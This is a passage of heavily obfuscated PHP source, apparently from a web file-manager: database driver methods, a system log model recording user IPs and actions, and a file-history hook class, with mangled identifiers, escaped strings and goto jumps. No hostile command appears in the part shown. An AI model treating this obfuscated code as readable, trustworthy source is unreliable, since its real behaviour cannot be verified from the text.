$¡œÖÌÌ .= $»şÊ…[51] . $‰ŞªëÒû[1] . $»şÊ…[52] . $‰ŞªëÒû[0] . $»şÊ…[53]; } else { $¡œÖÌÌ .= $»şÊ…[51] . $‰ŞªëÒû[0] . $»şÊ…[53]; } break; case $»şÊ…[1083]: case $»şÊ…[1101]: break; case $»şÊ…[1085]: break; case $»şÊ…[1084]: case $»şÊ…[1086]: break; case $»şÊ…[1113]: default: $¡œÖÌÌ .= $»şÊ…[51] . $‰ŞªëÒû . $»şÊ…[53]; } } return $¡œÖÌÌ; } public function parseKey(&$Í¶ä¿å, $©ŞšÍºÕ = true) { $Ò“Øù´€ =& $_SERVER[µÅ˜º…æ]; if ($©ŞšÍºÕ) { $Í¶ä¿å = $this->parseKeyCheck($Í¶ä¿å); } if ($this->dbType == $Ò“Øù´€[1113]) { if ($Í¶ä¿å != $Ò“Øù´€[220] && !preg_match($Ò“Øù´€[1077], $Í¶ä¿å)) { $Í¶ä¿å = $Ò“Øù´€[475] . trim($Í¶ä¿å, $Ò“Øù´€[475]) . $Ò“Øù´€[475]; } return $Í¶ä¿å; } else { return parent::parseKey($Í¶ä¿å, $©ŞšÍºÕ); } } public function close() { $this->_linkID = null; } public function error() { $Ÿ³Ó¤†ë =& $_SERVER[µÅ˜º…æ]; if ($this->PDOStatement) { $—Òß†¬á = $this->PDOStatement->errorInfo(); $this->error = $—Òß†¬á[1] . $Ÿ³Ó¤†ë[4] . $—Òß†¬á[2]; } else { $this->error = $Ÿ³Ó¤†ë[12]; } if ($Ÿ³Ó¤†ë[12] != $this->queryStr) { $this->error .= LNG($Ÿ³Ó¤†ë[48]) . $this->queryStr; } think_trace($this->error, $Ÿ³Ó¤†ë[12], $Ÿ³Ó¤†ë[49]); return $this->error; } public function escapeString($Î¡Æ„•) { $¿ë‹ìŞœ =& $_SERVER[µÅ˜º…æ]; switch ($this->dbType) { case $¿ë‹ìŞœ[1110]: case $¿ë‹ìŞœ[1083]: case $¿ë‹ìŞœ[1101]: case $¿ë‹ìŞœ[1113]: return addslashes($Î¡Æ„•); case $¿ë‹ìŞœ[1085]: case $¿ë‹ìŞœ[1102]: case $¿ë‹ìŞœ[1084]: case $¿ë‹ìŞœ[1086]: return str_ireplace($¿ë‹ìŞœ[58], $¿ë‹ìŞœ[59], $Î¡Æ„•); } } protected function parseValue($´Ğ‘úÜÂ) { $ıÇü×úÉ =& $_SERVER[µÅ˜º…æ]; if (is_string($´Ğ‘úÜÂ)) { $±À¥ÜÓ = strpos($´Ğ‘úÜÂ, $ıÇü×úÉ[4]) === 0 && in_array($´Ğ‘úÜÂ, array_keys($this->bind)); $´Ğ‘úÜÂ = $±À¥ÜÓ ? $this->escapeString($´Ğ‘úÜÂ) : $ıÇü×úÉ[1123] . $this->escapeString($´Ğ‘úÜÂ) . $ıÇü×úÉ[1123]; } elseif (isset($´Ğ‘úÜÂ[0]) && is_string($´Ğ‘úÜÂ[0]) && strtolower($´Ğ‘úÜÂ[0]) == $ıÇü×úÉ[372]) { $´Ğ‘úÜÂ = $this->escapeString($´Ğ‘úÜÂ[1]); } elseif (is_array($´Ğ‘úÜÂ)) { $´Ğ‘úÜÂ = array_map(array($this, $ıÇü×úÉ[1124]), $´Ğ‘úÜÂ); } elseif (is_bool($´Ğ‘úÜÂ)) { $´Ğ‘úÜÂ = $´Ğ‘úÜÂ ? $ıÇü×úÉ[91] : $ıÇü×úÉ[228]; } elseif (is_null($´Ğ‘úÜÂ)) { $´Ğ‘úÜÂ = $ıÇü×úÉ[103]; } return $´Ğ‘úÜÂ; } public function getLastInsertId() { $¢œ½Æ­ë =& $_SERVER[µÅ˜º…æ]; switch ($this->dbType) { case $¢œ½Æ­ë[1110]: case $¢œ½Æ­ë[1102]: case $¢œ½Æ­ë[1083]: case $¢œ½Æ­ë[1101]: case $¢œ½Æ­ë[1085]: case $¢œ½Æ­ë[1113]: return $this->_linkID->lastInsertId(); case $¢œ½Æ­ë[1084]: case $¢œ½Æ­ë[1086]: $¹¹ûØ±Ğ = $this->table; $ÚªéÚ = $this->query("\x53\x45\114\105\x43\124\x20{$¹¹ûØ±Ğ}\x2e\143\165\162\x72\166\141\x6c\x20\143\x75\x72\x72\x76\141\x6c\x20\x46\x52\117\115\x20\144\165\141\154"); return $ÚªéÚ ? $ÚªéÚ[0][$¢œ½Æ­ë[1125]] : 0; } } } goto eÀ„Ä¬£¼»; Aƒ¢à‚Øˆ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\114\151\147\150\164\x41\160\x70"; public $modelType = "\123\x79\163\x74\145\x6d\x4f\x70\164\x69\157\x6e"; public $field = array("\156\141\x6d\145", "\x67\x72\x6f\165\160", "\144\145\163\x63", "\x63\x6f\156\x74\145\x6e\164"); public function listData($Ğæš×ÁÂ = false, $ÄşÊú²Â = "\x6d\157\144\151\146\x79\x54\x69\155\145", $£ú¼ß¼ = true) { return parent::listData($Ğæš×ÁÂ, $ÄşÊú²Â, $£ú¼ß¼); } public function remove($ı†ö†ßŒ) { $€×¼Óì = $this->findByName($ı†ö†ßŒ); if (!$€×¼Óì) { return !1; } return parent::remove($€×¼Óì[$_SERVER[µÅ˜º…æ][487]]); } public function add($Ù­å‰¾) { if ($this->findByName($Ù­å‰¾[$_SERVER[µÅ˜º…æ][32]])) { return !1; } return parent::insert($Ù­å‰¾); } public function update($Õ”ªü, $å‘‰¿· ) { $øÇÂªÜà =& $_SERVER[µÅ˜º…æ]; $µò™’›Í = $this->findByName($Õ”ªü); $±²°…¢’ = $this->findByName($å‘‰¿· [$øÇÂªÜà[32]]); if (!$µò™’›Í || $±²°…¢’ && $±²°…¢’[$øÇÂªÜà[487]] != $µò™’›Í[$øÇÂªÜà[487]]) { return !1; } return parent::update($µò™’›Í[$øÇÂªÜà[487]], $å‘‰¿· ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\x6d\137\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\124\x69\155\145", "\x74\x69\155\145", "\151\x6e\x73\x65\162\164", "\146\x75\x6e\x63\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $”ÑÁˆÔ =& $_SERVER[µÅ˜º…æ]; return array($”ÑÁˆÔ[2550] => LNG($”ÑÁˆÔ[2551]), $”ÑÁˆÔ[2552] => LNG($”ÑÁˆÔ[2553]), $”ÑÁˆÔ[2127] => LNG($”ÑÁˆÔ[2554]), $”ÑÁˆÔ[2555] => LNG($”ÑÁˆÔ[2556]), $”ÑÁˆÔ[2557] => LNG($”ÑÁˆÔ[2558]), $”ÑÁˆÔ[2559] => LNG($”ÑÁˆÔ[2560]), $”ÑÁˆÔ[2561] => LNG($”ÑÁˆÔ[2562]), $”ÑÁˆÔ[2154] => LNG($”ÑÁˆÔ[2562]), $”ÑÁˆÔ[2155] => LNG($”ÑÁˆÔ[2563]), $”ÑÁˆÔ[2564] => LNG($”ÑÁˆÔ[2565]), $”ÑÁˆÔ[2566] => LNG($”ÑÁˆÔ[2567]), $”ÑÁˆÔ[2568] => LNG($”ÑÁˆÔ[2569]), $”ÑÁˆÔ[2570] => LNG($”ÑÁˆÔ[2571]), $”ÑÁˆÔ[2152] => LNG($”ÑÁˆÔ[2572]), $”ÑÁˆÔ[2573] => LNG($”ÑÁˆÔ[2574]), $”ÑÁˆÔ[2159] => LNG($”ÑÁˆÔ[2575]), $”ÑÁˆÔ[2576] => LNG($”ÑÁˆÔ[2577]), $”ÑÁˆÔ[2578] => LNG($”ÑÁˆÔ[2579]), $”ÑÁˆÔ[2580] => LNG($”ÑÁˆÔ[2581]), $”ÑÁˆÔ[2582] => LNG($”ÑÁˆÔ[2583]), $”ÑÁˆÔ[2161] => LNG($”ÑÁˆÔ[2584]), $”ÑÁˆÔ[2162] => LNG($”ÑÁˆÔ[2585]), $”ÑÁˆÔ[2586] => LNG($”ÑÁˆÔ[2587]), $”ÑÁˆÔ[2588] => LNG($”ÑÁˆÔ[2589]), $”ÑÁˆÔ[2590] => LNG($”ÑÁˆÔ[2591]), $”ÑÁˆÔ[2157] => LNG($”ÑÁˆÔ[2592]), $”ÑÁˆÔ[2593] => LNG($”ÑÁˆÔ[2594]), $”ÑÁˆÔ[2156] => LNG($”ÑÁˆÔ[2595]), $”ÑÁˆÔ[2596] => LNG($”ÑÁˆÔ[2596]), $”ÑÁˆÔ[2597] => LNG($”ÑÁˆÔ[2598]), $”ÑÁˆÔ[2599] => LNG($”ÑÁˆÔ[2596]), $”ÑÁˆÔ[2600] => LNG($”ÑÁˆÔ[2601]), $”ÑÁˆÔ[2602] => LNG($”ÑÁˆÔ[2603]), $”ÑÁˆÔ[2604] => LNG($”ÑÁˆÔ[2603]), $”ÑÁˆÔ[2605] => LNG($”ÑÁˆÔ[2606]), $”ÑÁˆÔ[2607] => LNG($”ÑÁˆÔ[2607]), $”ÑÁˆÔ[2608] => LNG($”ÑÁˆÔ[2131]), $”ÑÁˆÔ[2609] => LNG($”ÑÁˆÔ[2610]), $”ÑÁˆÔ[2611] => LNG($”ÑÁˆÔ[2612]), $”ÑÁˆÔ[2613] => LNG($”ÑÁˆÔ[2614]), $”ÑÁˆÔ[2615] => LNG($”ÑÁˆÔ[2616]), $”ÑÁˆÔ[2617] => LNG($”ÑÁˆÔ[2618]), $”ÑÁˆÔ[2619] => LNG($”ÑÁˆÔ[2619]), $”ÑÁˆÔ[2620] => LNG($”ÑÁˆÔ[2621]), $”ÑÁˆÔ[2622] => LNG($”ÑÁˆÔ[2623]), $”ÑÁˆÔ[2624] => LNG($”ÑÁˆÔ[2625]), $”ÑÁˆÔ[2626] => LNG($”ÑÁˆÔ[2627]), $”ÑÁˆÔ[2628] => LNG($”ÑÁˆÔ[2629]), $”ÑÁˆÔ[2630] => LNG($”ÑÁˆÔ[2631]), $”ÑÁˆÔ[210] => LNG($”ÑÁˆÔ[210]), $”ÑÁˆÔ[211] => LNG($”ÑÁˆÔ[2632]), $”ÑÁˆÔ[2633] => LNG($”ÑÁˆÔ[2633])); } private function typeFile() { $úâ†–šÀ =& $_SERVER[µÅ˜º…æ]; $åì¼Æ— = array($úâ†–šÀ[2159] => array($úâ†–šÀ[2160]), $úâ†–šÀ[2568] => array($úâ†–šÀ[2634]), $úâ†–šÀ[2570] => array($úâ†–šÀ[2635]), $úâ†–šÀ[2152] => array($úâ†–šÀ[2153], $úâ†–šÀ[2636]), $úâ†–šÀ[2578] => array(), $úâ†–šÀ[2580] => array(), $úâ†–šÀ[2582] => array(), $úâ†–šÀ[2161] => array($úâ†–šÀ[2163]), $úâ†–šÀ[2162] => array($úâ†–šÀ[2163]), $úâ†–šÀ[2586] => array($úâ†–šÀ[2637]), $úâ†–šÀ[2588] => array($úâ†–šÀ[2637]), $úâ†–šÀ[2590] => array($úâ†–šÀ[2638]), $úâ†–šÀ[2576] => array($úâ†–šÀ[2639]), $úâ†–šÀ[2157] => array($úâ†–šÀ[2640]), $úâ†–šÀ[2593] => array($úâ†–šÀ[2641]), $úâ†–šÀ[2156] => array($úâ†–šÀ[2158])); return $åì¼Æ—; } private function typeAll() { $İßúÁÔ— =& $_SERVER[µÅ˜º…æ]; $ïÃ÷è¯Ù = $this->typeList; $¦ ÅØÑ¤ = array_filter($this->typeFile()); foreach ($¦ ÅØÑ¤ as $¦¢Í€Ú… => $ŠÎìè÷«) { $ïÃ÷è¯Ù[$ŠÎìè÷«[0]] = $ïÃ÷è¯Ù[$¦¢Í€Ú…]; } $ïÃ÷è¯Ù[$İßúÁÔ—[2163]] = LNG($İßúÁÔ—[2642]); $ïÃ÷è¯Ù[$İßúÁÔ—[2637]] = LNG($İßúÁÔ—[2643]); return $ïÃ÷è¯Ù; } public function addLog($öË«ê¾õ, $ğÎŸˆŸ› = array()) { $Ğùà—æ =& $_SERVER[µÅ˜º…æ]; if (!isset($this->typeList[$öË«ê¾õ])) { return; } $¤êı¤ö² = Session::get($Ğùà—æ[2320]); if (!$¤êı¤ö²) { $¤êı¤ö² = _get($ğÎŸˆŸ›, $Ğùà—æ[1593], 0); } if ($öË«ê¾õ == $Ğùà—æ[2609] && is_array($ğÎŸˆŸ›[$Ğùà—æ[2644]]) && !$ğÎŸˆŸ›[$Ğùà—æ[2644]]) { return; } $òÉ²°ñ = get_client_ip(); if (!$ğÎŸˆŸ› || strlen(json_encode($ğÎŸˆŸ›)) >= 1024 * 64) { if ($ğÎŸˆŸ› && is_array($ğÎŸˆŸ›)) { $ğÎŸˆŸ› = array_intersect_key($ğÎŸˆŸ›, array_flip($Ğùà—æ[487], $Ğùà—æ[32])); $ğÎŸˆŸ›[$Ğùà—æ[1609]] = $òÉ²°ñ; } else { $ğÎŸˆŸ› = array($Ğùà—æ[1609] => $òÉ²°ñ); } } else { if (is_array($ğÎŸˆŸ›)) { $ğÎŸˆŸ›[$Ğùà—æ[1609]] = $òÉ²°ñ; } else { $ğÎŸˆŸ› = array($Ğùà—æ[1393] => $ğÎŸˆŸ›, $Ğùà—æ[1609] => $òÉ²°ñ); } } $ğÎŸˆŸ›[$Ğùà—æ[2645]] = ACTION; $ğÎŸˆŸ› = array($Ğùà—æ[1966] => Session::sign(), $Ğùà—æ[1967] => intval($¤êı¤ö²), $Ğùà—æ[33] => $öË«ê¾õ, $Ğùà—æ[1969] => json_encode($ğÎŸˆŸ›)); Hook::trigger($Ğùà—æ[2646], $ğÎŸˆŸ›); return parent::add($ğÎŸˆŸ›); } public function remove($üç“¿™) { $this->where(array($_SERVER[µÅ˜º…æ][508] => $üç“¿™))->delete(); } private function _makeOrder($ˆ§†¨Ğ¡ = '') { $ÀªÑ§úû =& $_SERVER[µÅ˜º…æ]; $¨úµ®ˆ = $ÀªÑ§úû[231]; $¥©ƒüßÌ = array($ÀªÑ§úû[537] => $ÀªÑ§úû[538], $ÀªÑ§úû[539] => $ÀªÑ§úû[540]); $ÕŒ¦ë›ğ = Input::get($ÀªÑ§úû[545], $ÀªÑ§úû[7], $ÀªÑ§úû[2357], array($ÀªÑ§úû[2276], $ÀªÑ§úû[539])); $ÕŒ¦ë›ğ = $¥©ƒüßÌ[$ÕŒ¦ë›ğ]; $ˆ§†¨Ğ¡ = $ˆ§†¨Ğ¡ . "{$¨úµ®ˆ}\40{$ÕŒ¦ë›ğ}"; return $this->order($ˆ§†¨Ğ¡); } public function get($®·„üÁ¾ = '') { $…ñ¢Æ¨ª =& $_SERVER[µÅ˜º…æ]; if (!$®·„üÁ¾) { show_json(array()); } $µÍúê¯ = array(); if ($®·„üÁ¾[$…ñ¢Æ¨ª[1593]]) { $µÍúê¯[$…ñ¢Æ¨ª[1593]] = $®·„üÁ¾[$…ñ¢Æ¨ª[1593]]; } if (isset($®·„üÁ¾[$…ñ¢Æ¨ª[860]])) { $‡ŞÚëşÅ = $®·„üÁ¾[$…ñ¢Æ¨ª[860]]; $èåà— = isset($®·„üÁ¾[$…ñ¢Æ¨ª[861]]) ? $®·„üÁ¾[$…ñ¢Æ¨ª[861]] : time(); $µÍúê¯[$…ñ¢Æ¨ª[231]] = array($…ñ¢Æ¨ª[408], array($‡ŞÚëşÅ, $èåà—)); } if ($®·„üÁ¾[$…ñ¢Æ¨ª[33]]) { $ˆ¼—§ßš = explode($…ñ¢Æ¨ª[50], $®·„üÁ¾[$…ñ¢Æ¨ª[33]]); $õ–ç…éŸ = $this->typeFile(); $Œô = array(); foreach ($ˆ¼—§ßš as $¸­ºÉ) { $Œô[] = $¸­ºÉ; if (isset($õ–ç…éŸ[$¸­ºÉ])) { $Œô = array_merge($Œô, $õ–ç…éŸ[$¸­ºÉ]); } } $Œô = array_unique($Œô); if ($Œô) { $µÍúê¯[$…ñ¢Æ¨ª[33]] = array($…ñ¢Æ¨ª[7], $Œô); } } else { $µÍúê¯[$…ñ¢Æ¨ª[33]] = array($…ñ¢Æ¨ª[2647], $…ñ¢Æ¨ª[2648]); } if (!empty($®·„üÁ¾[$…ñ¢Æ¨ª[1609]])) { $µÍúê¯[$…ñ¢Æ¨ª[540]] = array($…ñ¢Æ¨ª[473], "\45{$®·„üÁ¾[$…ñ¢Æ¨ª[1609]]}\x25"); } $Ëª×Ë€Ü = $this->_makeOrder()->where($µÍúê¯)->selectPage(); if (empty($Ëª×Ë€Ü[$…ñ¢Æ¨ª[446]])) { show_json(array(), !0, $Ëª×Ë€Ü[$…ñ¢Æ¨ª[443]]); } $Ëª×Ë€Ü[$…ñ¢Æ¨ª[446]] = $this->logList($Ëª×Ë€Ü[$…ñ¢Æ¨ª[446]]); return $Ëª×Ë€Ü; } private function ipAddress(&$ÕÃ“â¹™) { $À°Šƒ–ø =& $_SERVER[µÅ˜º…æ]; if (!empty($ÕÃ“â¹™[$À°Šƒ–ø[1609]])) { $Şá´Íò“ = IpLocation::get($ÕÃ“â¹™[$À°Šƒ–ø[1609]]); } else { $Şá´Íò“ = LNG($À°Šƒ–ø[2649]); } $ÕÃ“â¹™[$À°Šƒ–ø[2650]] = $Şá´Íò“; } private function descZipDownload($‹¾ÏšÌ¥, &$‚”›ÉÒÉ) { $‰®£Ê† =& $_SERVER[µÅ˜º…æ]; if (!isset($‹¾ÏšÌ¥[$‰®£Ê†[1616]])) { return; } $ÚâÏá¨ = json_decode($‹¾ÏšÌ¥[$‰®£Ê†[1616]], !0); foreach ($ÚâÏá¨ as $‰ÃßûäØ) { try { $ãÊ»ú·Ä = IO::infoFullSimple($‰ÃßûäØ[$‰®£Ê†[87]]); } catch (Exception $ÌÌÒ¹Ò…) { continue; } $‹¾ÏšÌ¥[$‰®£Ê†[87]] = $‰ÃßûäØ[$‰®£Ê†[87]]; $‚”›ÉÒÉ[] = $‹¾ÏšÌ¥[$‰®£Ê†[191]] = $ãÊ»ú·Ä[$‰®£Ê†[191]]; $‚”›ÉÒÉ[] = $‹¾ÏšÌ¥[$‰®£Ê†[2417]] = $ãÊ»ú·Ä[$‰®£Ê†[190]]; break; } return $‹¾ÏšÌ¥; } private function getSourceList(&$‡ñœãï“) { $—™âÕàé =& $_SERVER[µÅ˜º…æ]; $™»Ùòô± = array(); foreach ($‡ñœãï“ as $í£²—™… => $ÉÕ¸­ø) { $²µû˜ë¾ = json_decode($ÉÕ¸­ø[$—™âÕàé[540]], !0); if ($ÉÕ¸­ø[$—™âÕàé[33]] == $—™âÕàé[2155]) { $²µû˜ë¾ = $this->descZipDownload($²µû˜ë¾, $™»Ùòô±); $‡ñœãï“[$í£²—™…][$—™âÕàé[540]] = json_encode($²µû˜ë¾); continue; } if (strpos($ÉÕ¸­ø[$—™âÕàé[33]], $—™âÕàé[2419]) !== 0) { if (!isset($²µû˜ë¾[$—™âÕàé[87]]) || strpos($ÉÕ¸­ø[$—™âÕàé[33]], $—™âÕàé[2651]) !== 0) { continue; } try { $ˆ¶ˆ¡¿ã = IO::infoFullSimple($²µû˜ë¾[$—™âÕàé[87]]); } catch (Exception $ú‹¿±¨ƒ) { continue; } $™»Ùòô±[] = $²µû˜ë¾[$—™âÕàé[191]] = $ˆ¶ˆ¡¿ã[$—™âÕàé[191]]; $™»Ùòô±[] = $²µû˜ë¾[$—™âÕàé[2417]] = $ˆ¶ˆ¡¿ã[$—™âÕàé[190]]; $‡ñœãï“[$í£²—™…][$—™âÕàé[540]] = json_encode($²µû˜ë¾); continue; } $™»Ùòô±[] = $²µû˜ë¾[$—™âÕàé[191]]; $™»Ùòô±[] = $²µû˜ë¾[$—™âÕàé[2417]]; if ($²µû˜ë¾[$—™âÕàé[33]] == $—™âÕàé[643]) { $™»Ùòô±[] = $²µû˜ë¾[$—™âÕàé[540]][$—™âÕàé[1347]]; $™»Ùòô±[] = $²µû˜ë¾[$—™âÕàé[540]][$—™âÕàé[1348]]; } if ($²µû˜ë¾[$—™âÕàé[33]] == $—™âÕàé[2427]) { $™»Ùòô±[] = $²µû˜ë¾[$—™âÕàé[540]][$—™âÕàé[191]]; } } if (!$™»Ùòô±) { return array(); } return Model($—™âÕàé[932])->sourceListInfo($™»Ùòô±, !0); } private function logList($º¿àì‚À) { $ô‰±ø£Ã =& $_SERVER[µÅ˜º…æ]; $¨óŒ¢Üè = array_to_keyvalue($º¿àì‚À, $ô‰±ø£Ã[12], $ô‰±ø£Ã[1593]); $Ïäí³œ = Model($ô‰±ø£Ã[617])->userListInfo(array_unique($¨óŒ¢Üè)); $ƒ¶ØµÓ• = $this->getSourceList($º¿àì‚À); $¾ò’ì±Š = $this->typeAll(); $å‚°Ö÷ó = array(); $üÛëÜ¾ = array(); foreach ($º¿àì‚À as $©…»Ï¡ => $´× œÊ) { $¹øË”ºÚ = $´× œÊ[$ô‰±ø£Ã[33]]; $Í•ÒáÉ = isset($Ïäí³œ[$´× œÊ[$ô‰±ø£Ã[1593]]]) ? $Ïäí³œ[$´× œÊ[$ô‰±ø£Ã[1593]]] : !1; $ÕÍãÚÈ = strpos($¹øË”ºÚ, $ô‰±ø£Ã[2652]) === 0 ? LNG($ô‰±ø£Ã[2653]) : LNG($ô‰±ø£Ã[2649]); $´× œÊ[$ô‰±ø£Ã[32]] = isset($Í•ÒáÉ[$ô‰±ø£Ã[32]]) ? $Í•ÒáÉ[$ô‰±ø£Ã[32]] : LNG($ô‰±ø£Ã[2649]); $´× œÊ[$ô‰±ø£Ã[2475]] = isset($Í•ÒáÉ[$ô‰±ø£Ã[2475]]) ? $Í•ÒáÉ[$ô‰±ø£Ã[2475]] : $ô‰±ø£Ã[12]; $´× œÊ[$ô‰±ø£Ã[1865]] = isset($¾ò’ì±Š[$¹øË”ºÚ]) ? $¾ò’ì±Š[$¹øË”ºÚ] : $ÕÍãÚÈ; $´× œÊ[$ô‰±ø£Ã[2356]] = $Í•ÒáÉ; $¿Õ¶‡³ƒ = json_decode($´× œÊ[$ô‰±ø£Ã[540]], !0); $´× œÊ[$ô‰±ø£Ã[1609]] = isset($¿Õ¶‡³ƒ[$ô‰±ø£Ã[1609]]) ? $¿Õ¶‡³ƒ[$ô‰±ø£Ã[1609]] : $ô‰±ø£Ã[12]; $´× œÊ[$ô‰±ø£Ã[2650]] = IpLocation::get($´× œÊ[$ô‰±ø£Ã[1609]]); if (strpos($¹øË”ºÚ, $ô‰±ø£Ã[2419]) === 0 || isset($¿Õ¶‡³ƒ[$ô‰±ø£Ã[2417]])) { $¿Õ¶‡³ƒ[$ô‰±ø£Ã[90]] = $ƒ¶ØµÓ•[$¿Õ¶‡³ƒ[$ô‰±ø£Ã[191]]]; $¿Õ¶‡³ƒ[$ô‰±ø£Ã[2433]] = $ƒ¶ØµÓ•[$¿Õ¶‡³ƒ[$ô‰±ø£Ã[2417]]]; if ($¿Õ¶‡³ƒ[$ô‰±ø£Ã[33]] == $ô‰±ø£Ã[643]) { $¿Õ¶‡³ƒ[$ô‰±ø£Ã[540]][$ô‰±ø£Ã[1347]] = $ƒ¶ØµÓ•[$¿Õ¶‡³ƒ[$ô‰±ø£Ã[540]][$ô‰±ø£Ã[1347]]]; $¿Õ¶‡³ƒ[$ô‰±ø£Ã[540]][$ô‰±ø£Ã[1348]] = $ƒ¶ØµÓ•[$¿Õ¶‡³ƒ[$ô‰±ø£Ã[540]][$ô‰±ø£Ã[1348]]]; } if ($¿Õ¶‡³ƒ[$ô‰±ø£Ã[33]] == $ô‰±ø£Ã[2427]) { $¿Õ¶‡³ƒ[$ô‰±ø£Ã[540]][$ô‰±ø£Ã[191]] = $ƒ¶ØµÓ•[$¿Õ¶‡³ƒ[$ô‰±ø£Ã[540]][$ô‰±ø£Ã[191]]]; } if ($¿Õ¶‡³ƒ[$ô‰±ø£Ã[33]] == $ô‰±ø£Ã[1335]) { $¿Õ¶‡³ƒ[$ô‰±ø£Ã[2433]] = $¿Õ¶‡³ƒ[$ô‰±ø£Ã[90]]; $¿Õ¶‡³ƒ[$ô‰±ø£Ã[2417]] = $¿Õ¶‡³ƒ[$ô‰±ø£Ã[2433]][$ô‰±ø£Ã[191]]; $¿Õ¶‡³ƒ[$ô‰±ø£Ã[90]] = !1; $¿Õ¶‡³ƒ[$ô‰±ø£Ã[191]] = $ô‰±ø£Ã[12]; } $»±Í–Ü = array($ô‰±ø£Ã[1335], $ô‰±ø£Ã[2415]); if (!in_array($¿Õ¶‡³ƒ[$ô‰±ø£Ã[33]], $»±Í–Ü)) { if ($¿Õ¶‡³ƒ[$ô‰±ø£Ã[90]] && $¿Õ¶‡³ƒ[$ô‰±ø£Ã[90]][$ô‰±ø£Ã[188]] == $ô‰±ø£Ã[189]) { $üÛëÜ¾[] = $´× œÊ[$ô‰±ø£Ã[487]]; unset($º¿àì‚À[$©…»Ï¡]); continue; } if ($¿Õ¶‡³ƒ[$ô‰±ø£Ã[2433]] && $¿Õ¶‡³ƒ[$ô‰±ø£Ã[2433]][$ô‰±ø£Ã[188]] == $ô‰±ø£Ã[189]) { $üÛëÜ¾[] = $´× œÊ[$ô‰±ø£Ã[487]]; unset($º¿àì‚À[$©…»Ï¡]); continue; } } } $´× œÊ[$ô‰±ø£Ã[540]] = $¿Õ¶‡³ƒ; unset($´× œÊ[$ô‰±ø£Ã[2654]]); $å‚°Ö÷ó[] = $´× œÊ; } $this->clearSystemPathLog($üÛëÜ¾); return $å‚°Ö÷ó; } private function clearSystemPathLog($ƒÒãïãÎ) { $¥ğİ¾ô® =& $_SERVER[µÅ˜º…æ]; if (count($ƒÒãïãÎ) == 0) { return; } $µŸ…ğëÕ = array($¥ğİ¾ô®[487] => array($¥ğİ¾ô®[7], array_unique($ƒÒãïãÎ))); $this->where($µŸ…ğëÕ)->delete(); } public function deviceList($ÇÇñ¬Ç, $ğ´üêÜÌ = 0) { $ÖÆ•½© =& $_SERVER[µÅ˜º…æ]; $ş¼ŞˆÛ• = array($ÖÆ•½©[1593] => $ÇÇñ¬Ç, $ÖÆ•½©[231] => array($ÖÆ•½©[1183], $ğ´üêÜÌ), $ÖÆ•½©[33] => $ÖÆ•½©[2127]); $†ÍÒ½‘Ğ = array(); $‡’‹Ï·« = $this->field($ÖÆ•½©[2655])->where($ş¼ŞˆÛ•)->order($ÖÆ•½©[2431])->limit(50)->select(); foreach ($‡’‹Ï·« as $ìÃüí–â => $îúñÈ£¡) { if ($ìÃüí–â > 0 && abs($îúñÈ£¡[$ÖÆ•½©[231]] - $‡’‹Ï·«[$ìÃüí–â - 1][$ÖÆ•½©[231]]) < 5) { continue; } $¥ğÕòÊŞ = json_decode($îúñÈ£¡[$ÖÆ•½©[540]], !0); $îúñÈ£¡[$ÖÆ•½©[1609]] = isset($¥ğÕòÊŞ[$ÖÆ•½©[1609]]) ? $¥ğÕòÊŞ[$ÖÆ•½©[1609]] : $ÖÆ•½©[12]; unset($¥ğÕòÊŞ[$ÖÆ•½©[1609]]); $÷€­§µ = $this->deviceType($¥ğÕòÊŞ[$ÖÆ•½©[2420]]); if (isset($†ÍÒ½‘Ğ[$÷€­§µ])) { continue; } $îúñÈ£¡[$ÖÆ•½©[2650]] = IpLocation::get($îúñÈ£¡[$ÖÆ•½©[1609]]); $îúñÈ£¡[$ÖÆ•½©[540]] = $¥ğÕòÊŞ; $†ÍÒ½‘Ğ[$÷€­§µ] = $îúñÈ£¡; } return array_values($†ÍÒ½‘Ğ); } public function deviceType($˜ôÄ÷) { return $˜ôÄ÷; } } $_file = $_SERVER[$_SERVER[µÅ˜º…æ][1023]]; goto aÄ¸Ô¹˜; e£ëï‰­ö: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $àüÖıš‡ =& $_SERVER[µÅ˜º…æ]; $™“ç†‘ = $GLOBALS[$àüÖıš‡[6]][$àüÖıš‡[92]]; if ($™“ç†‘[$àüÖıš‡[1407]] != 1) { return; } if ($™“ç†‘[$àüÖıš‡[1408]] <= 0) { return; } if (isset($_REQUEST[$àüÖıš‡[1409]]) && $_REQUEST[$àüÖıš‡[1409]] == $àüÖıš‡[91]) { return; } Hook::bind($àüÖıš‡[1410], $àüÖıš‡[1411]); Hook::bind($àüÖıš‡[1412], $àüÖıš‡[1413]); Hook::bind($àüÖıš‡[1414], $àüÖıš‡[1415]); Hook::bind($àüÖıš‡[1416], $àüÖıš‡[1417]); Hook::bind($àüÖıš‡[1418], $àüÖıš‡[1419]); Hook::bind($àüÖıš‡[1420], $àüÖıš‡[1421]); } public static function eventBeforeUpload($ûÖ°åß¯) { if ($ûÖ°åß¯[3] && $ûÖ°åß¯[3] != REPEAT_REPLACE) { return; } $½‹±ŠÒ¸ = self::parsePath($ûÖ°åß¯[0]); if (!$½‹±ŠÒ¸) { return; } self::add($½‹±ŠÒ¸); } public static function eventBeforeEdit($»ºÅ¥„) { $–¬„Îú = self::parsePath($»ºÅ¥„[0]); if (!$–¬„Îú) { return; } self::add($–¬„Îú); } public static function eventBeforeCopyFile($×›§™ÔÄ, $Óš´¿×”, $‘‰˜¤ìÛ, $½¯ÜÌıŞ, $áÖ³í˜ô, $‘åäê±¼) { $ßò½ø¯² =& $_SERVER[µÅ˜º…æ]; if (isset($‘‰˜¤ìÛ->_data[$ßò½ø¯²[1342]]) && $‘‰˜¤ìÛ->_data[$ßò½ø¯²[1342]]) { return; } $àÕÌ£ûò = $‘‰˜¤ìÛ->getPathOuter($½¯ÜÌıŞ); $ñ›¿ˆ… = self::parsePath($àÕÌ£ûò); if (!$ñ›¿ˆ…) { return; } self::add($ñ›¿ˆ…); } public static function eventBeforeRename($ÅØâşÛ) { $à™ı¹ıÂ =& $_SERVER[µÅ˜º…æ]; $´ÖäÆşî = self::parsePath($ÅØâşÛ[0]); if (!$´ÖäÆşî) { return; } $¢Û â—Ñ = self::checkInHistory($´ÖäÆşî); if (!$¢Û â—Ñ) { return; } if ($¢Û â—Ñ[$à™ı¹ıÂ[33]] == 